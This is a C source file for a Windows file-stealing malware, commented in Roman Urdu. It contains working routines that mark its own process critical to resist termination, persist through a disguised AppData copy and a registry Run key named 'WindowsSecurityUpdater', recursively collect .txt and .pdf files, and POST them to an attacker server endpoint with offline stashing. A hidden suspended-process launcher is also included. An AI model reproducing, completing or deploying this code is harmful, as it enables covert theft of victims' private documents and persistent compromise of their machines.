#include "loader.h"

// 1. Anti-Kill: Critical process mark karke "Access Denied" lana
void ProtectProcess() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // 1. Process ka Token open karo taakay hum privileges change kar sakein
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // 2. Windows se "SeDebugPrivilege" ka ID dhoondo (Ye system level kaam ke liye chahiye)
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            // 3. Apne process ko ye "Haq" (Privilege) do
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
        CloseHandle(hToken);
    }

    // 4. Ab jab humary paas Debug privilege hai, tab Critical mark karo
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
        pRtlSetProcessIsCritical SetCritical = (pRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        if (SetCritical) {
            // Ab ye function fail nahi hoga
            SetCritical(TRUE, NULL, FALSE);
        }
    }
}

// 2. Boot Persistence: Copy to AppData & Registry Run Key
void SetPersistence() {
    char currentPath[MAX_PATH], targetPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    sprintf(targetPath, "%s\\system_update.exe", getenv("APPDATA"));
    CopyFileA(currentPath, targetPath, FALSE);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsSecurityUpdater", 0, REG_SZ, (BYTE*)targetPath, (DWORD)strlen(targetPath));
        RegCloseKey(hKey);
    }
}

// 3. Smart Exfiltration: Server par bhejo ya ProgramData mein chupao
void StashOrSend(const char* filename, const char* content, long size) {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConn = InternetConnectA(hSession, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    
    BOOL success = FALSE;
    if (hConn) {
        HINTERNET hReq = HttpOpenRequestA(hConn, "POST", "/spectre_gate", NULL, NULL, NULL, 0, 0);
        char* payload = (char*)malloc(size + 1000);
        if (payload) {
            sprintf(payload, "[SOURCE: %s]\n%s", filename, content);
            if (HttpSendRequestA(hReq, NULL, 0, payload, (DWORD)strlen(payload))) success = TRUE;
            free(payload);
        }
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
    }
    InternetCloseHandle(hSession);

    if (!success) {
        CreateDirectoryA(STASH_DIR, NULL);
        char stashPath[MAX_PATH];
        sprintf(stashPath, "%s\\%s.stash", STASH_DIR, filename);
        FILE *f = fopen(stashPath, "wb");
        if (f) { fwrite(content, 1, size, f); fclose(f); }
    }
}

// 4. Auto-Sync: Purana stash bhej dena jab server live ho
void SyncOfflineData() {
    WIN32_FIND_DATAA findData;
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*.stash", STASH_DIR);
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            char fullPath[MAX_PATH];
            sprintf(fullPath, "%s\\%s", STASH_DIR, findData.cFileName);
            FILE *f = fopen(fullPath, "rb");
            if (f) {
                fseek(f, 0, SEEK_END); long size = ftell(f); fseek(f, 0, SEEK_SET);
                char* buf = (char*)malloc(size + 1);
                fread(buf, 1, size, f); fclose(f);
                StashOrSend(findData.cFileName, buf, size);
                free(buf); DeleteFileA(fullPath);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
}

// 5. Recursive Stealer
void RecursiveSteal(const char* basePath) {
    WIN32_FIND_DATAA findData;
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", basePath);
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
        char fullPath[MAX_PATH];
        sprintf(fullPath, "%s\\%s", basePath, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            RecursiveSteal(fullPath);
        } else if (strstr(findData.cFileName, ".txt") || strstr(findData.cFileName, ".pdf")) {
            FILE *f = fopen(fullPath, "rb");
            if (f) {
                fseek(f, 0, SEEK_END); long s = ftell(f); fseek(f, 0, SEEK_SET);
                if (s > 0 && s < 5000000) {
                    char* b = (char*)malloc(s + 1); fread(b, 1, s, f); fclose(f);
                    StashOrSend(findData.cFileName, b, s); free(b);
                } else { fclose(f); }
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
}

void MockHollow(const char* target) {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    if (CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}